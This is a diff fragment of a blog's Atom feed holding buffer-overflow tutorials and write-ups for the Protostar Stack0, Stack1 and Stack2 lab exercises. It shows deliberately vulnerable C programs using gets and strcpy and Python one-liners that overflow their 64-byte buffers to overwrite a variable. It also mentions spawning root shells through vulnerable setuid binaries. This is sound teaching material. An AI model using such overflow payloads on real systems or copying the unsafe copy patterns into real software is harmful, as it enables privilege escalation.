resources</title><link href="http://localhost:4000/lists/stego/" rel="alternate" type="text/html" title="Steganography - A list of useful tools and resources" /><published>2019-01-25T00:00:00+02:00</published><updated>2019-01-25T00:00:00+02:00</updated><id>http://localhost:4000/lists/stego</id><content type="html" xml:base="http://localhost:4000/lists/stego/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;steganography&quot;&gt;Steganography&lt;/h3&gt;
 &lt;h4 id=&quot;steganography-is-hiding-a-file-or-a-message-inside-of-another-file--there-are-many-fun-steganography-ctf-challenges-out-there-where-the-flag-is-hidden-in-an-image--audio-file-or-even-other-types-of-files-here-is-a-list-of-the-most-tools-i-use-and-some-other-useful-resources&quot;&gt;Steganography is hiding a file or a message inside of another file , there are many fun steganography CTF challenges out there where the flag is hidden in an image , audio file or even other types of files. Here is a list of the most tools I use and some other useful resources.&lt;/h4&gt;
@@ -1401,179 +1811,4 @@ char buffer[64];
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-buffer-overflow-article--binary-exploitation---buffer-overflow-explained-in-detail&quot;&gt;Previous Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof1/&quot;&gt;Binary Exploitation - Buffer Overflow Explained in Detail&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-buffer-overflow-article--buffer-overflow-practical-examples--metasploit--gdb-and-objdump----protostar-stack3&quot;&gt;Next Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof3/&quot;&gt;Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction So last week I talked about bufferoverflows and solved Protostar Stack0. Today I’m gonna solve Stack1 and Stack2, they are not different from Stack0 in their objective which is changing a variable’s value , but they are different in the way of changing that variable for sure. With that being said let’s jump right in ! If you haven’t read my previous post yet I recommend reading it before this. Stack1 For this challenge we got this code : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, &quot;please specify an argument\n&quot;); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(&quot;you have correctly got the variable to the right value\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } } Breakdown So this code : creates a variable called “modified” and assigns a buffer of 64 chars to it. volatile int modified; char buffer[64]; Checks if we supplied an argument or not. if(argc == 1) { errx(1, &quot;please specify an argument\n&quot;); } Sets the value of the “modified” variable into 0 , then it copies whatever we give it argv[1] into the buffer of “modified”. modified = 0; strcpy(buffer, argv[1]); Then it checks if the variable’s value is 0x61626364 or not if(modified == 0x61626364) { printf(&quot;you have correctly got the variable to the right value\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } Solution So it’s similar to Stack0 except we need to set the value of the variable into a specific value which is 0x61626364 in this case. This is the hexadecimal value of “dcba” now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let’s try it. Let’s execute stack1 We get please specify an argument so let’s enter anything. We get try again you got 0x00000000 , Let’s try to change that by exceeding the buffer and entering any char for example “b” ./stack1 `python -c &quot;print ('A' * 64 + 'b')&quot;` And we see that the value changed to 0x00000062 which is the hex value of “b” so our exploit is working, Let’s apply that. ./stack1 `python -c &quot;print ('A' * 64 + 'dcba')&quot;` And we did it ! But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them. ./stack1 `python -c &quot;print('A' * 64 + '\x64\x63\x62\x61')&quot;` Stack2 For this challenge we got this code : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; char *variable; variable = getenv(&quot;GREENIE&quot;); if(variable == NULL) { errx(1, &quot;please set the GREENIE environment variable\n&quot;); } modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) { printf(&quot;you have correctly modified the variable\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } } Breakdown This code : As always creates a variable called “modified” and assigns a buffer of 64 chars to it volatile int modified; char buffer[64]; The new thing here is a variable called “variable” which gets its value from an environment variable called “GREENIE”. variable = getenv(&quot;GREENIE&quot;); The program checks if the variable “variable” has a value or not if(variable == NULL) { errx(1, &quot;please set the GREENIE environment variable\n&quot;); } Sets the value of modified to 0 modified = 0; Then it copies the value of “variable” into the buffer of “modified” strcpy(buffer, variable); After that it checks if the value of “modified” is 0x0d0a0d0a or not if(modified == 0x0d0a0d0a) { printf(&quot;you have correctly modified the variable\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } Solution So this time we can’t specify the value directly instead of that we have to do it through an environment variable. And this is actually a good example that shows the importance of being creative with your exploits , you won’t face the same situation every time so you have to come up with an exploit that fits with the application’s functionality. In this situation we can apply our usual exploit and store that value into the environment variable “GREENIE”. But wait a minute , what is an environment variable ? Environment Variables Simply , Environment variables are variables that are being used to store values of some stuff that the system uses also the services can access those variables. For a better demonstration let’s see an example. If we take the environment variable BASH and look at it : We see that its value is : /bin/bash So for example if I want to run bash I type bash in the terminal instead of ./bin/bash because the system calls the variable BASH and finds its path. But the system won’t store a variable for every binary that exists on the system so there’s an environment variable called PATH which has all the possible dirs that could contain bins, So when you type for example : python, it searches in those dirs then executes python So you get the idea. Understanding environment variables is not necessary for this challenge but I wanted to talk about it just to make everything clear for anyone. More about environment variables Now let’s execute stack2 We get Please set the GREENIE environment variable. There’s no environment variable called GREENIE so we need to create it. We will make it’s value equal to 64 chars then 0x0d0a0d0a This time we won’t be able to use the value in ASCII like we did with stack1 because 0x0d is a return \r and 0x0a is a new line \n and we can’t type those so we will use the hex values and python will translate them. GREENIE = `python -c &quot;print ('A' * 64 + '\x0a\x0d\x0a\x0d')&quot;` When we look at it we only see the 64 A’s and that’s because we can’t see the new line or the return Now we need to export it to the environment variables list then we are good to go. export GREENIE ./stack2 And we did it ! That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Binary Exploitation - Buffer Overflow Explained in Detail Next Buffer Overflow article : Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF2/0.png" /></entry><entry><title type="html">Binary Exploitation - Buffer Overflow Explained in Detail</title><link href="http://localhost:4000/binary-exploitation/bof1/" rel="alternate" type="text/html" title="Binary Exploitation - Buffer Overflow Explained in Detail" /><published>2018-12-19T00:00:00+02:00</published><updated>2018-12-19T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof1</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof1/">&lt;hr /&gt;
-
-&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
-&lt;h4 id=&quot;so-first-of-all-i-know-that-there-are-many-tutorials-published-about-buffer-overflow-and-binary-exploitation-but-i-decided-to-write-this-article-because-most-of-these-tutorials-and-articles-dont-really-talk-about-the-basic-fundmentals-needed-to-understand-what-a-buffer-overflow-really-is-they-just-go-explaining-whats-a-buffer-overflow-without-explaining-what-is-a-buffer--what-is-a-stack-or-what-are-memory-addresses-etc-and-i-just-wanted-to-make-it-easier-for-someone-who-wants-to-learn-about-it-to-find-an-article-that-covers-the-basics-so-what-im-going-to-talk-about-in-this-article-is-what-is-a-buffer--what-is-a-stack-and-what-are-the-memory-addresses-and-we-will-take-a-look-at-the-application-memory-structure--what-is-a-buffer-overflow-and-why-does-it-happen-then-ill-show-a-really-basic-and-simple-example-for-exploiting-a-buffer-overflow-protostar-stack0&quot;&gt;So first of all I know that there are many tutorials published about buffer overflow and binary exploitation but I decided to write this article because most of these tutorials and articles don’t really talk about the basic fundmentals needed to understand what a buffer overflow really is. They just go explaining what’s a buffer overflow without explaining what is a buffer , what is a stack or what are memory addresses etc. And I just wanted to make it easier for someone who wants to learn about it to find an article that covers the basics. So what I’m going to talk about in this article is what is a buffer , what is a stack and what are the memory addresses and we will take a look at the application memory structure , what is a buffer overflow and why does it happen then I’ll show a really basic and simple example for exploiting a buffer overflow (protostar stack0)&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/0.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;buffer&quot;&gt;Buffer&lt;/h2&gt;
-&lt;h4 id=&quot;so-whats-a-buffer--simply-a-buffer-is-a-memory-place-or-location-which-is-used-by-a-running-program-this-memory-location-is-used-to-store-some-temporary-data-that-is-being-used-by-the-program-so-for-example-if-we-have-a-simple-program-that-asks-the-user-to-enter-his-name-and-stores-it-in-a-variable-called-username-then-it-prints-hello-username---for-example-if-we-run-the-program-and-enter-username-as-rick-the-word-rick-is-stored-in-the-buffer-until-the-program-executes-the-print-command-and-it-retrieves-the-given-username-rick-from-the-buffer-to-output-the-result--hello-rick&quot;&gt;So what’s a buffer ? Simply a buffer is a memory place or location which is used by a running program. This memory location is used to store some temporary data that is being used by the program. So for example if we have a simple program that asks the user to enter his name and stores it in a variable called &lt;em&gt;username&lt;/em&gt; then it prints “Hello &lt;em&gt;username&lt;/em&gt; “ . For example if we run the program and enter username as “Rick”. The word “Rick” is stored in the buffer until the program executes the print command and it retrieves the given username “Rick” from the buffer to output the result : “Hello Rick”&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;our-example-written-in-c-will-be-like-this&quot;&gt;Our example written in c will be like this&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-
-int main () {
-   char username[20];
-
-   printf(&quot;Enter your name: &quot;);
-   scanf(&quot;%s&quot;, username);
-
-   printf(&quot;Hello %s\n&quot;, username);
-   
-   return(0);
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h3 id=&quot;break-down&quot;&gt;Break Down&lt;/h3&gt;
-&lt;h4 id=&quot;int-main-this-defines-the-main-function&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int main()&lt;/code&gt; This defines the main function&lt;/h4&gt;
-&lt;h4 id=&quot;char-username20-this-is-where-we-specify-the-variable-name-but-the-most-important-thing-about-this-line-is-char--20-this-is-where-we-specify-the-buffer-for-that-variable--and-i-assigned-it-as-20-chars&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;char username[20]&lt;/code&gt; This is where we specify the variable name but the most important thing about this line is &lt;code class=&quot;highlighter-rouge&quot;&gt;char .... [20]&lt;/code&gt; this is where we specify the buffer for that variable , and i assigned it as 20 chars&lt;/h4&gt;
-&lt;h4 id=&quot;the-rest-of-the-code-takes-the-user-input-then-prints-it&quot;&gt;The rest of the code takes the user input then prints it.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;Enter your name: &quot;);&lt;/code&gt; 
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;scanf(&quot;%s&quot;, username);&lt;/code&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;Hello %s\n, username&quot;);&lt;/code&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-when-we-compile-and-run-this-program-we-get-the-output-as-expected-right-&quot;&gt;So when we compile and run this program we get the output as expected right ?&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/binary-exploitation/BOF/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-before-we-talk-about-the-buffer-overflow-we-need-to-understand-how-the-application-memory-works&quot;&gt;Now before we talk about the buffer overflow we need to understand how the application memory works&lt;/h4&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;application-memory--stack-and-memory-addresses&quot;&gt;Application Memory , Stack and Memory Addresses&lt;/h2&gt;
-&lt;h4 id=&quot;so-how-does-the-application-memory-look-like-and-whats-a-stack--a-stack-is-a-memory-buffer-that-is-used-to-store-the-functions-of-the-program-and-local-variables-to-demonstrate-this-we-will-take-a-look-at-this-image&quot;&gt;So how does the application memory look like and what’s a stack ? A stack is a memory buffer that is used to store the functions of the program and local variables. To demonstrate this, we will take a look at this image.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;first-we-have-the-code-and-this-is-the-source-code-of-the-program-this-has-the-main-instructions-of-the-program&quot;&gt;First We have the code and this is the source code of the program. This has the main instructions of the program.&lt;/h4&gt;
-&lt;h4 id=&quot;after-that-we-have-the-buffer-where-the-global-variables-are-stored&quot;&gt;After that we have the buffer where the global variables are stored,&lt;/h4&gt;
-&lt;h4 id=&quot;the-difference-between-a-local-variable-and-a-global-variable-is-that-a-local-variable-is-limited-to-a-certain-function-its-defined-in-that-function-and-can-be-only-called-in-that-function-but-a-global-variable-is-either-defined-in-the-main-function-or-defined-outside-a-function-and-this-type-of-variables-can-be-called-anywhere&quot;&gt;&lt;em&gt;The difference between a local variable and a global variable is that a local variable is limited to a certain function. It’s defined in that function and can be only called in that function but a global variable is either defined in the main function or defined outside a function and this type of variables can be called anywhere&lt;/em&gt;.&lt;/h4&gt;
-&lt;h4 id=&quot;then-we-have-the-stack-and-this-is-the-important-part-of-the-memory-for-us-because-this-is-where-the-buffer-overflow-happens-this-is-the-place-where-local-variable-and-function-calls-are-stored&quot;&gt;Then we have the Stack and this is the important part of the memory for us because this is where the buffer overflow happens. This is the place where local variable and function calls are stored.&lt;/h4&gt;
-&lt;h4 id=&quot;last-thing-is-heap-and-this-is-a-dynamic-memory-allocation&quot;&gt;Last thing is Heap and this is a dynamic memory allocation.&lt;/h4&gt;
-&lt;h4 id=&quot;now-we-know-what-does-the-application-memory-look-like-and-what-is-the-stack-but-what-are-memory-addresses-&quot;&gt;Now we know what does the application memory look like and what is the stack but what are memory addresses ?&lt;/h4&gt;
-&lt;h4 id=&quot;basically-when-a-program-is-compiled-and-executed--all-the-instructions-of-the-program-take-place-in-the-application-memory-and-an-address-is-assigned-to-them--this-address-is-usually-in-the-format-of-hexadecimal-bytes&quot;&gt;Basically when a program is compiled and executed , All the instructions of the program take place in the application memory and an address is assigned to them , This address is usually in the format of hexadecimal bytes.&lt;/h4&gt;
-&lt;h4 id=&quot;so-if-you-disassemble-a-program-and-look-at-it-youll-find-the-memory-addresses--something-like-this-&quot;&gt;So if you disassemble a program and look at it you’ll find the memory addresses , something like this :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/3.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;why-do-buffer-overflows-happen-&quot;&gt;Why Do Buffer Overflows Happen ?&lt;/h2&gt;
-&lt;h4 id=&quot;now-we-know-what-is-a-buffer-and-we-took-a-deeper-look-on-the-memory-construction-now-you-might-already-figured-out-why-and-when-does-a-buffer-overflow-happen-a-buffer-overflow-happens-when-the-length-of-the-data-entered-exceeds-the-buffer-limit-and-this-causes-the-program-to-write-data-outside-the-allocated-buffer-area-and-may-overwrite-some-parts-of-the-memory-that-were-used-to-hold-data-used-by-the-program-which-makes-it-unavailable-and-causes-the-program-to-crash-to-demonstrate-this-we-will-go-back-to-our-first-example&quot;&gt;Now we know what is a buffer and we took a deeper look on the memory construction. Now you might already figured out why and when does a buffer overflow happen. A buffer overflow happens when the length of the data entered exceeds the buffer limit and this causes the program to write data outside the allocated buffer area and may overwrite some parts of the memory that were used to hold data used by the program which makes it unavailable and causes the program to crash. To demonstrate this we will go back to our first example.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-
-int main () {
-   char username[20];
-
-   printf(&quot;Enter your name: &quot;);
-   scanf(&quot;%s&quot;, username);
-
-   printf(&quot;Hello %s\n&quot;, username);
-   printf(&quot;Program exited normally&quot;);
-   return(0);
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;we-will-add-a-last-line-to-print-the-sentence-program-exited-noramlly-just-for-demonstration-purposes&quot;&gt;We will add a last line to print the sentence “program exited noramlly” just for demonstration purposes&lt;/h4&gt;
-&lt;h4 id=&quot;now-the-program-should-ask-us-for-username-then-print-hello-username-then-print-program-exited-normally-and-exits-the-buffer-for-holding-the-username-value-is-set-to-20-chars--its-good-as-long-as-the-username-length-is-less-than-20-chars-but-if-the-entered-data-is-more-than-20-chars-length-the-program-will-crash-because-some-data-will-be-overwritten-outside-the-buffer-causing-some-parts-of-the-program-to-be-corrupted-in-our-case-this-will-be-the-part-which-prints-program-exited-normally&quot;&gt;Now the program should ask us for username then print “Hello &lt;em&gt;username&lt;/em&gt;” then print “program exited normally” and exits. The buffer for holding the username value is set to 20 chars , it’s good as long as the username length is less than 20 chars. But if the entered data is more than 20 chars length the program will crash because some data will be overwritten outside the buffer causing some parts of the program to be corrupted. in our case this will be the part which prints “program exited normally”&lt;/h4&gt;
-&lt;h4 id=&quot;first-lets-run-the-program-and-enter-the-name-as-rick&quot;&gt;First let’s run the program and enter the name as Rick&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-program-exits-normally&quot;&gt;The program exits normally.&lt;/h4&gt;
-&lt;h4 id=&quot;now-lets-run-it-again-and-enter-the-name-as-30-as&quot;&gt;Now let’s run it again and enter the name as 30 A’s&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-get-hello-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-printed-then-we-dont-see-program-exited-normally-and-we-get-a-segmentation-fault-error-that-happened-because-we-entered-10-extra-chars-the-program-only-expected-20-or-less-those-extra-aaaaaaaaaa-exceeded-the-20-chars-buffer-and-overwrited-other-data-the-print-instruction-which-prints-program-exited-normally-which-caused-a-segmentation-fault-because-the-program-is-corrupted&quot;&gt;We get “Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA” printed then we don’t see “program exited normally” and we get a segmentation fault error. That happened because we entered 10 extra chars, The program only expected 20 or less. Those extra “AAAAAAAAAA” exceeded the 20 chars buffer and overwrited other data (The print instruction which prints “program exited normally”) which caused a segmentation fault because the program is corrupted.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;examining-buffer-overflows-with-gdb&quot;&gt;Examining Buffer Overflows with gdb&lt;/h2&gt;
-&lt;h4 id=&quot;lets-take-a-deeper-look-at-how-this-is-happening-with-gdb-gnu-debugger&quot;&gt;Let’s take a deeper look at how this is happening with gdb (gnu debugger).&lt;/h4&gt;
-&lt;h4 id=&quot;we-will-write-another-program-that-creates-a-variable-called-whatever-then-it-copies-what-we-give-it-and-put-it-in-that-variable-and-we-will-assign-the-buffer-for-that-variable-to-be-20&quot;&gt;We will write another program that creates a variable called “whatever” then it copies what we give it and put it in that variable. And we will assign the buffer for that variable to be 20&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-
-int main(int argc, char** argv)
-{
-	char whatever[20];
-	strcpy(whatever, argv[1]);
-
-	return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;breakdown&quot;&gt;Breakdown&lt;/h3&gt;
-&lt;h4 id=&quot;int-mainint-argc-char-argv-this-defines-the-main-function-and-its-arguments&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int main(int argc, char** argv)&lt;/code&gt; This defines the main function and it’s arguments&lt;/h4&gt;
-&lt;h4 id=&quot;char-whatever20-this-creates-the-variable-and-gives-it-the-name-whatever-and-assigns-its-buffer-to-20&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;char whatever[20];&lt;/code&gt; This creates the variable and gives it the name “whatever” and assigns its buffer to 20&lt;/h4&gt;
-&lt;h4 id=&quot;strcpywhatever-argv1-this-copies-our-input-and-puts-it-into-our-variable-whatever&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strcpy(whatever, argv[1]);&lt;/code&gt; This copies our input and puts it into our variable “whatever”&lt;/h4&gt;
-&lt;h4 id=&quot;return-0-and-this-is-our-return-address&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;return 0;&lt;/code&gt; And this is our return address&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-lets-run-the-program-inside-gdb-and-test-it&quot;&gt;Now let’s run the program inside gdb and test it.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-input-was-aaaaa-which-is-less-than-20-chars-so-the-program-exited-normally-and-everything-is-good&quot;&gt;The input was aaaaa which is less than 20 chars so the program exited normally and everything is good&lt;/h4&gt;
-&lt;h4 id=&quot;now-lets-throw-an-input-more-that-20-chars&quot;&gt;Now let’s throw an input more that 20 chars.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-get-a-segmentation-fault-because-our-return-address-is-overwritten-and-the-program-couldnt-continue&quot;&gt;We get a segmentation fault because our return address is overwritten and the program couldn’t continue.&lt;/h4&gt;
-&lt;h4 id=&quot;to-show-how-are-these-addresses-overwritten-lets-input-any-hex-value--something-like-x12-for-50-times-then-lets-look-at-the-registers&quot;&gt;To show how are these addresses overwritten let’s input any hex value , something like \x12 for 50 times. Then let’s look at the registers.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-see-that-most-of-the-memory-addresses-are-overwritten-with-12&quot;&gt;We see that most of the memory addresses are overwritten with 12&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;why-are-buffer-overflows-dangerous-&quot;&gt;Why Are Buffer Overflows Dangerous ?&lt;/h2&gt;
-&lt;h4 id=&quot;now-you-might-ask-yourself--how-will-that-be-harmful-&quot;&gt;Now you might ask yourself , How will that be harmful ?&lt;/h4&gt;
-&lt;h4 id=&quot;a-buffer-overflow-is-dangerous-when-the-vulnerable-binary-or-program-is-a-setuid-binary--if-you-dont-know-what-setuid-binaries-are-read-the-provided-link-but-in-general-they-are-programs-that-run-with-capabilities-of-another-user-usually-root--but-when-that-program-is-vulnerable-to-a-buffer-overflow-its-not-a-good-thing-anymore-since-we-can-pass-the-buffer-and-overwrite-the-program-then-we-can-overwrite-it-with-a-payload-that-executes-a-system-call-and-spawns-a-root-shell&quot;&gt;A buffer overflow is dangerous when the vulnerable binary or program is a &lt;a href=&quot;https://en.wikipedia.org/wiki/Setuid&quot;&gt;setuid&lt;/a&gt; binary , If you don’t know what setuid binaries are, read the provided link, but in general They are programs that run with capabilities of another user (usually root) , But when that program is vulnerable to a buffer overflow it’s not a good thing anymore. Since we can pass the buffer and overwrite the program then we can overwrite it with a payload that executes a system call and spawns a root shell&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h4 id=&quot;i-will-do-more-write-ups-about-buffer-overflows-and-other-binary-exploitation-techniques-for-now-i-will-start-with-protostar&quot;&gt;I will do more write ups about buffer overflows and other binary exploitation techniques, for now I will start with protostar.&lt;/h4&gt;
-&lt;h4 id=&quot;there-are-also-some-cool-boxes-on-hack-the-box-that-required-buffer-overflows-and-binary-exploitation-to-gain-root-privileges-but-theyre-active-right-now-so-ill-publish-my-write-ups-about-these-boxes-as-soon-as-they-retire-of-course-in-the-meantime-you-can-read-my-other-hack-the-box-write-ups-&quot;&gt;There are also some cool boxes on Hack The box that required buffer overflows and binary exploitation to gain root privileges but they’re active right now so I’ll publish my write ups about these boxes as soon as they retire of course. In the meantime, you can read my other &lt;a href=&quot;https://0xrick.github.io&quot;&gt;Hack The Box write-ups&lt;/a&gt; !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;protostar-stack0&quot;&gt;Protostar Stack0&lt;/h2&gt;
-&lt;h4 id=&quot;now-lets-do-a-simple-practical-example&quot;&gt;Now let’s do a simple practical example.&lt;/h4&gt;
-&lt;h4 id=&quot;you-can-download-protostar-from-here&quot;&gt;You can download protostar from &lt;a href=&quot;https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;i-will-solve-the-first-level-which-is-stack0-for-this-article-then-i-will-solve-the-rest-of-the-levels-in-other-write-ups&quot;&gt;I will solve the first level which is stack0 for this article then I will solve the rest of the levels in other write-ups.&lt;/h4&gt;
-&lt;h4 id=&quot;were-given-the-source-code-of-the-program-&quot;&gt;We’re given the source code of the program :&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-
-int main(int argc, char **argv)
-{
- volatile int modified;
- char buffer[64];
-
- modified = 0;
- gets(buffer);
-
- if(modified != 0) {
-  printf(&quot;you have changed the 'modified' variable\n&quot;);
- } else {
-  printf(&quot;Try again?\n&quot;);
- }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;from-the-code-we-can-understand-that-the-program-has-a-variable-called-buffer-and-assigns-a-buffer-of-64-chars-to-it-then-theres-another-variable-called-modified-and-its-value-is-0-getsbuffer-allows-us-to-input-the-value-of-buffer-variablethen-theres-an-if-statement-that-checks-if-the-value-of-modified-variable-is-not-equal-to-0-if-its-not-equal-to-zero-it-will-print-you-have-changed-the-modified-variable-but-if-its-still-equal-to-0-it-will-print-try-again-so-our-mission-is-to-change-the-value-of-that-variable-called-modified&quot;&gt;From the code we can understand that the program has a variable called “buffer” and assigns a buffer of 64 chars to it. Then there’s another variable called modified and it’s value is 0. gets(buffer) allows us to input the value of “buffer” variable.Then there’s an if statement that checks if the value of “modified” variable is not equal to 0. If it’s not equal to zero it will print “you have changed the ‘modified’ variable” but if it’s still equal to 0 it will print “Try again?”. So our mission is to change the value of that variable called “modified”&lt;/h4&gt;
-&lt;h4 id=&quot;as-long-as-the-entered-data-is-less-than-64-chars-everything-will-run-as-intended-but-if-the-input-exceeds-the-buffer-it-will-overwrite-the-value-of-modified-variable&quot;&gt;As long as the entered data is less than 64 chars everything will run as intended. But if the input exceeds the buffer it will overwrite the value of “modified” variable.&lt;/h4&gt;
-&lt;h4 id=&quot;we-already-know-that-the-buffer-is-64-chars-so-we-just-need-to-input-65-chars-or-more-and-the-variable-value-will-change-lets-test-that-out&quot;&gt;We already know that the buffer is 64 chars so we just need to input 65 chars or more and the variable value will change. Let’s test that out.&lt;/h4&gt;
-&lt;h4 id=&quot;we-execute-the-stack0-bin-and-we-see-the-output-try-again&quot;&gt;We execute the stack0 bin and we see the output “try again?”&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-throw-65-as-and-see-the-output&quot;&gt;Let’s throw 65 “A”s and see the output.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print ('A' * 65)&quot; | ./stack0 &lt;/code&gt;
-&lt;img src=&quot;/images/binary-exploitation/BOF/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-have-successfuly-overwritten-the-variables-value--d&quot;&gt;And we have successfuly overwritten the variable’s value ! :D&lt;/h4&gt;
